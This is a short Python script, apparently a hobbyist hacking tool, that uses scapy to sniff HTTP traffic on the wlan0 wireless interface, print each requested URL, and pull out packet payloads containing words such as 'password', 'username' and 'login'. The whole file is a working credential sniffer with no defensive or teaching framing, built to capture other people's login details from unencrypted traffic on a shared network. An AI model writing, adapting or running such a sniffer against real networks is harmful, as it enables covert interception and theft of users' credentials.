import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=print_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_user_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["email","username","password","login","user"]
        for keyword in keywords:
            if keyword in load:
                return load
    

def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url= get_url(packet)
        print("Link>> "+url)
        password= get_user_info(packet)
        if password:
            print("Password>> "+password)

sniff("wlan0")